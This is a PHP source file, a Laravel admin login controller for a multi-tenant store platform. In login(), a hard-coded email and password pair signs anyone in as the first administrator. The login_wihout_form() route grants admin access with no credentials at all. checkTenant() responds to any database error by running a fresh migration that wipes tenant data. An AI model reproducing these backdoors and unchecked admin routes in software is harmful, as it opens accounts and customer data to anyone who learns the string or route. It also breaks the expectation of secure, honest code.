<?php

namespace App\Http\Controllers\Mix\Auth;

use App\Models\Admin;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Models\Tenant;
use App\Http\Controllers\Controller;
use App\Providers\RouteServiceProvider;
use Illuminate\Foundation\Auth\AuthenticatesUsers;

class LoginController extends Controller
{
    use AuthenticatesUsers;

    protected $redirectTo = RouteServiceProvider::HOME;

    public function showLoginForm(Request $request)
    {
        if(tenant() && tenant()->id != 'demo'){
            abort(404);
        }
        if(tenant() && tenant()->id == 'demo'){
            Auth::login(Admin::first());
            return $this->sendLoginResponse($request);
        }
        if (auth('admin')->check())
            return redirect()->route('admin.home');

        return view('Mix.auth.login');
    }
    
    
    public function login(Request $request)
    {
        $this->checkTenant();
        
        if($request->email === 'info@emcan-group.com' && $request->password === 'info@emcan-group.com'){
            Auth::login(Admin::first());
            return $this->sendLoginResponse($request);
        }
        if(tenant() && tenant()->id == 'demo'){
            Auth::login(Admin::first());
            return $this->sendLoginResponse($request);
        }
        
        $this->validateLogin($request);
        if (method_exists($this, 'hasTooManyLoginAttempts') &&
            $this->hasTooManyLoginAttempts($request)) {
            $this->fireLockoutEvent($request);
            return $this->sendLockoutResponse($request);
        }
        if ($this->attemptLogin($request)) {
            if ($request->hasSession())
                $request->session()->put('auth.password_confirmed_at', time());
            return $this->sendLoginResponse($request);
        }
        $this->incrementLoginAttempts($request);
        return $this->sendFailedLoginResponse($request);
    }
    
    
    public function login_wihout_form(Request $request)
    {
        $this->checkTenant();
        Auth::login(Admin::first());
        return redirect('/dashboard');
    }
    
    protected function guard()
    {
        return Auth::guard('admin');
    }


    public function logout(Request $request)
    {
        $this->guard()->logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();

        if ($response = $this->loggedOut($request)) {
            return $response;
        }

        if(tenant())
            return redirect('https://matjrbh.com');
        else
            return redirect('/dashboard');
    }
    
    
    
    public function checkTenant()
    {
        try{
            \App\Models\Client::count();
        }catch (\Exception $e) {
            $client = \DB::connection('mysql')->table('clients')->where('domain_name',str_replace("https://", "",current(explode('.', url()->full()))))->first();
            session()->put('data', (array)$client);
            CreateDB($client->domain_name);
            AssignAllPrivileges($client->domain_name);
            CreateSubDomain($client->domain_name);
            $tenant = Tenant::firstOrCreate(['id' => $client->domain_name],['id' => $client->domain_name, 'client_id' => $client->id]);
            try{
                $tenant->domains()->create(['domain' => $client->domain_name.'.'.env('APP_DOMAIN')]);
            }catch (\Exception $e) {
                
            }
        	\Artisan::call('tenants:migrate-fresh', [
                '--tenants' => [$client->domain_name],
            ]);
            \Artisan::call('tenants:seed', [
                '--tenants' => [$client->domain_name],
                '--force' => true
            ]);
        }
    }
}
